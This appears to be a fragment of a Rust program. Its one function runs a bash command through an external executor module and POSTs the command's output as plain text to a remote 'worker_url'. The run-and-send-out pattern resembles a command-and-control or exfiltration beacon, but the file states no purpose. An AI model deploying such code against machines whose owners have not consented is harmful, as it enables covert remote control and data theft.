use reqwest::Client;

pub async fn send_data_request(worker_url: &str) -> Result<String, reqwest::Error> {
    let command_output = command_executor::execute_bash_command(true)?;

    let client = Client::new();
    let response = client
        .post(worker_url)
        .header("Content-Type", "text/plain")
        .body(command_output)
        .send()
        .await?
        .text()
        .await?;

    Ok(response)
}